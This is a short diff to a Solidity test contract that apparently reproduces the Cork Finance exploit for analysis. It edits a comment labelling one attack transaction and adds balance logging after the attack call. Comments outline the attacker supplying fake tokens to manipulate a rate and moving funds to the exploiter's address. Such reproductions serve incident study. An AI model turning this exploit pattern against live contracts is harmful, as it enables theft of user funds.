@@ -48,7 +48,7 @@ contract Exploit_CorkFinance is TestHarness, TokenBalanceTracker {
         EXPLOITER_EOA = address(this);
         // Several transactions were involved in this attack.
         // These three are being investigated on this reproduction:
-        // 1: 0x14cdf1a643fc94a03140b7581239d1b7603122fbb74a80dd4704dfb336c1dec0 (get LP Tokens)
+        // 1: 0x14cdf1a643fc94a03140b7581239d1b7603122fbb74a80dd4704dfb336c1dec0 (get DS Tokens)
         // 2: 0x89ba58edaf9f40dc0c781c40351ba392be31263faa6be3a29c2ee152f271df6d (approve Att SC for LP's)
         // 3: 0xfd89cdd0be468a564dd525b222b728386d7c6780cf7b2f90d2b54493be09f64d (main attack)
 
@@ -116,6 +116,8 @@ contract Exploit_CorkFinance is TestHarness, TokenBalanceTracker {
         12. Transfer all the LP and wstETH balance to exploiter's EOA
         */
         attSC_1.attack();
+
+        logBalancesWithLabel("Attacker balance after first tx", address(this));
 
         // At this point, the attacker managed to manipulate the rate supplying fake worthless tokens.
         // Tx 2 approves the Malicious Callback to handle all Attacker's LP tokens
